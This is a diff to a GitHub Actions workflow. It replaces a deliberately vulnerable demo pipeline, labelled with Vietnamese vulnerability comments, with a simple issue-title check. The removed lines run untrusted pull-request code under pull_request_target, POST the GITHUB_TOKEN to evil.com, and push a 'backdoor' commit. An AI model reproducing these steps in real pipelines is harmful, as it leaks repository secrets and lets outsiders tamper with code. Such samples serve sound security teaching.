@@ -1,41 +1,38 @@
-name: Vulnerable CI/CD Pipeline
+name: Add Comment for issue
 
 on:
-  pull_request_target:
-    types: [opened, synchronize, reopened]
-  workflow_dispatch:
+  issues:
+    types: [opened]
 
 jobs:
-  vulnerable-job:
+  check_issue_title:
+    name: Check issue
     runs-on: ubuntu-latest
+    env:
+      TITLE_PASSED: "T"
+      ISSUE_TITLE: ${{ github.event.issue.title }}
+    permissions:
+      issues: write
+    timeout-minutes: 20
     steps:
-    
-      # 🚨 LỖ HỔNG 1: Checkout mã nguồn từ PR mà không kiểm tra
-      - name: Checkout PR Code
-        uses: actions/checkout@v4
-        with:
-          ref: ${{ github.event.pull_request.head.ref }}
-          repository: ${{ github.event.pull_request.head.repo.full_name }}
-          token: ${{ secrets.GITHUB_TOKEN }}
-
-      # 🚨 LỖ HỔNG 2: Chạy script không kiểm soát từ PR
-      - name: Run arbitrary script from PR
+      - name: Checkout
+        uses: actions/checkout@v2
+      - name: Check Issue
+        shell: bash
         run: |
-          chmod +x malicious.sh
-          ./malicious.sh
+          echo "Issue title: ${ISSUE_TITLE//\"/\\\"}"
 
-      # 🚨 LỖ HỔNG 3: Lấy secret và gửi ra ngoài
-      - name: Leak GitHub Token
-        run: |
-          echo "Leaking secret..."
-          curl -X POST -d "token=${{ secrets.GITHUB_TOKEN }}" http://evil.com/steal-token
-
-      # 🚨 LỖ HỔNG 4: Commit & Push thay đổi vào repo chính mà không kiểm soát
-      - name: Commit and push code
-        run: |
-          git config --global user.email "attacker@evil.com"
-          git config --global user.name "Attacker"
-          echo "Hacked!" >> HACKED.txt
-          git add HACKED.txt
-          git commit -m "Inject backdoor"
-          git push origin ${{ github.event.pull_request.head.ref }}
+          cat >> check_title.py << EOF
+          import re
+          import sys
+          check_str = sys.argv[1]
+          pattern = re.compile(r'[\u4e00-\u9fa5]')
+          match = pattern.search(check_str)
+          if match:
+              print("TITLE_PASSED=F")
+          else:
+              print("TITLE_PASSED=T")
+          EOF
+          
+          python3 check_title.py "${ISSUE_TITLE//\"/\\\"}" >> "$GITHUB_ENV"
+          cat $GITHUB_ENV
